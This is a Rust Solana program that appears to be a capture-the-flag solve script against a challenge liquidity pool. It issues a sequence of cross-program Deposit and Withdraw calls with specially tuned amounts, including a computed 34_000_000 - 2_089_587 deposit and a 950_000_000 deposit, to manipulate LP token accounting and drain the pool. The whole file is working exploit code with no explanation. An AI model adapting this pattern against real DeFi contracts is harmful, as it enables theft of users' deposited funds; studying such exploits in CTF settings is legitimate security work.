use borsh::{BorshSerialize, BorshDeserialize};

use solana_program::{
    account_info::{
        next_account_info,
        AccountInfo,
    },
    entrypoint::ProgramResult,
    instruction::{
        AccountMeta,
        Instruction,
    },
    program::invoke,
    pubkey::Pubkey, log,
};

pub fn process_instruction(_program: &Pubkey, accounts: &[AccountInfo], _data: &[u8]) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();
    let admin = next_account_info(accounts_iter)?;
    let user = next_account_info(accounts_iter)?;
    let user_token_account = next_account_info(accounts_iter)?;
    let pool = next_account_info(accounts_iter)?;
    let mint = next_account_info(accounts_iter)?;
    let chall_id = next_account_info(accounts_iter)?;
    let rent = next_account_info(accounts_iter)?;
    let token_program = next_account_info(accounts_iter)?;
    let associated_token_program = next_account_info(accounts_iter)?;
    let system_program = next_account_info(accounts_iter)?;
    let solve_program = next_account_info(accounts_iter)?;

    let mut records  = vec![];

    for i in 0..17 {
        records.push(next_account_info(accounts_iter)?);
    }

    if (**pool.lamports.borrow() > 800_000_000) && (**user.lamports.borrow() > 800_000_000) {
        for i in 0..11 {
            let record_1 = records[i];
            let fisrt = Instruction::new_with_bytes(
                chall_id.key.clone(),
                &chall::processor::PoolInstruction::Deposit(100, [i as u8].to_vec()).try_to_vec().unwrap(),
                vec![
                    AccountMeta::new(pool.key.clone(), false),
                    AccountMeta::new(record_1.key.clone(), false),
                    AccountMeta::new(user.key.clone(), true),
                    AccountMeta::new(user_token_account.key.clone(), false),
                    AccountMeta::new(mint.key.clone(), false),
                    AccountMeta::new_readonly(token_program.key.clone(), false),
                    AccountMeta::new_readonly(associated_token_program.key.clone(), false),
                    AccountMeta::new_readonly(system_program.key.clone(), false),
                ],
            );
        
            invoke(&fisrt, 
                &[
                    pool.clone(),
                    user.clone(),
                    rent.clone(),
                    record_1.clone(),
                    user_token_account.clone(),
                    mint.clone(),
                    token_program.clone(),
                    system_program.clone(),
                    chall_id.clone(),
                    associated_token_program.clone(),
            ]);
        }
    }  else if (**pool.lamports.borrow() > 100_000_000) && (**user.lamports.borrow() > 800_000_000) {
         {
            for i in 11..13 {
                let record_1 = records[i];
                let fisrt = Instruction::new_with_bytes(
                    chall_id.key.clone(),
                    &chall::processor::PoolInstruction::Deposit(100, [i as u8].to_vec()).try_to_vec().unwrap(),
                    vec![
                        AccountMeta::new(pool.key.clone(), false),
                        AccountMeta::new(record_1.key.clone(), false),
                        AccountMeta::new(user.key.clone(), true),
                        AccountMeta::new(user_token_account.key.clone(), false),
                        AccountMeta::new(mint.key.clone(), false),
                        AccountMeta::new_readonly(token_program.key.clone(), false),
                        AccountMeta::new_readonly(associated_token_program.key.clone(), false),
                        AccountMeta::new_readonly(system_program.key.clone(), false),
                    ],
                );
            
                invoke(&fisrt, 
                    &[
                        pool.clone(),
                        user.clone(),
                        rent.clone(),
                        record_1.clone(),
                        user_token_account.clone(),
                        mint.clone(),
                        token_program.clone(),
                        system_program.clone(),
                        chall_id.clone(),
                        associated_token_program.clone(),
                ]);
            }
            let record_1 = records[13];
            let fisrt = Instruction::new_with_bytes(
                chall_id.key.clone(),
                &chall::processor::PoolInstruction::Deposit(34_000_000 - 2_089_587, [13 as u8].to_vec()).try_to_vec().unwrap(), // 9588
                vec![
                    AccountMeta::new(pool.key.clone(), false),
                    AccountMeta::new(record_1.key.clone(), false),
                    AccountMeta::new(user.key.clone(), true),
                    AccountMeta::new(user_token_account.key.clone(), false),
                    AccountMeta::new(mint.key.clone(), false),
                    AccountMeta::new_readonly(token_program.key.clone(), false),
                    AccountMeta::new_readonly(associated_token_program.key.clone(), false),
                    AccountMeta::new_readonly(system_program.key.clone(), false),
                ],
            );
        
            invoke(&fisrt, 
                &[
                    pool.clone(),
                    user.clone(),
                    rent.clone(),
                    record_1.clone(),
                    user_token_account.clone(),
                    mint.clone(),
                    token_program.clone(),
                    system_program.clone(),
                    chall_id.clone(),
                    associated_token_program.clone(),
            ]);

            let record_1 = records[14];
            let fisrt = Instruction::new_with_bytes(
                chall_id.key.clone(),
                &chall::processor::PoolInstruction::Deposit(100, [14 as u8].to_vec()).try_to_vec().unwrap(),
                vec![
                    AccountMeta::new(pool.key.clone(), false),
                    AccountMeta::new(record_1.key.clone(), false),
                    AccountMeta::new(user.key.clone(), true),
                    AccountMeta::new(user_token_account.key.clone(), false),
                    AccountMeta::new(mint.key.clone(), false),
                    AccountMeta::new_readonly(token_program.key.clone(), false),
                    AccountMeta::new_readonly(associated_token_program.key.clone(), false),
                    AccountMeta::new_readonly(system_program.key.clone(), false),
                ],
            );
        
            invoke(&fisrt, 
                &[
                    pool.clone(),
                    user.clone(),
                    rent.clone(),
                    record_1.clone(),
                    user_token_account.clone(),
                    mint.clone(),
                    token_program.clone(),
                    system_program.clone(),
                    chall_id.clone(),
                    associated_token_program.clone(),
            ]);

            let record_1 = records[14];
            let fisrt = Instruction::new_with_bytes(
                chall_id.key.clone(),
                &chall::processor::PoolInstruction::Deposit(950_000_000, [14 as u8].to_vec()).try_to_vec().unwrap(),
                vec![
                    AccountMeta::new(pool.key.clone(), false),
                    AccountMeta::new(record_1.key.clone(), false),
                    AccountMeta::new(user.key.clone(), true),
                    AccountMeta::new(user_token_account.key.clone(), false),
                    AccountMeta::new(mint.key.clone(), false),
                    AccountMeta::new_readonly(token_program.key.clone(), false),
                    AccountMeta::new_readonly(associated_token_program.key.clone(), false),
                    AccountMeta::new_readonly(system_program.key.clone(), false),
                ],
            );
        
            invoke(&fisrt, 
                &[
                    pool.clone(),
                    user.clone(),
                    rent.clone(),
                    record_1.clone(),
                    user_token_account.clone(),
                    mint.clone(),
                    token_program.clone(),
                    system_program.clone(),
                    chall_id.clone(),
                    associated_token_program.clone(),
            ]);

            for i in 0..6 {
                let record_1 = records[i];
                let amt = chall::state::DepositRecord::try_from_slice(&record_1.data.borrow())?.lp_token_amount;
    
                let fisrt = Instruction::new_with_bytes(
                    chall_id.key.clone(),
                    &chall::processor::PoolInstruction::Withdraw(amt, [i as u8].to_vec()).try_to_vec().unwrap(),
                    vec![
                        AccountMeta::new(pool.key.clone(), false),
                        AccountMeta::new(record_1.key.clone(), false),
                        AccountMeta::new(user.key.clone(), true),
                        AccountMeta::new(user_token_account.key.clone(), false),
                        AccountMeta::new(mint.key.clone(), false),
                        AccountMeta::new_readonly(token_program.key.clone(), false),
                        AccountMeta::new_readonly(associated_token_program.key.clone(), false),
                        AccountMeta::new_readonly(system_program.key.clone(), false),
                    ],
                );

                invoke(&fisrt, 
                    &[
                        pool.clone(),
                        user.clone(),
                        rent.clone(),
                        record_1.clone(),
                        user_token_account.clone(),
                        mint.clone(),
                        token_program.clone(),
                        system_program.clone(),
                        chall_id.clone(),
                        associated_token_program.clone(),
                ]);
            }
        }


    } else {
        for i in 6..15 {
            let record_1 = records[i];
            let amt = chall::state::DepositRecord::try_from_slice(&record_1.data.borrow())?.lp_token_amount;


            let fisrt = Instruction::new_with_bytes(
                chall_id.key.clone(),
                &chall::processor::PoolInstruction::Withdraw(amt, [i as u8].to_vec()).try_to_vec().unwrap(),
                vec![
                    AccountMeta::new(pool.key.clone(), false),
                    AccountMeta::new(record_1.key.clone(), false),
                    AccountMeta::new(user.key.clone(), true),
                    AccountMeta::new(user_token_account.key.clone(), false),
                    AccountMeta::new(mint.key.clone(), false),
                    AccountMeta::new_readonly(token_program.key.clone(), false),
                    AccountMeta::new_readonly(associated_token_program.key.clone(), false),
                    AccountMeta::new_readonly(system_program.key.clone(), false),
                ],
            );
        
            invoke(&fisrt, 
                &[
                    pool.clone(),
                    user.clone(),
                    rent.clone(),
                    record_1.clone(),
                    user_token_account.clone(),
                    mint.clone(),
                    token_program.clone(),
                    system_program.clone(),
                    chall_id.clone(),
                    associated_token_program.clone(),
            ]);
        }
    }

    Ok(())
}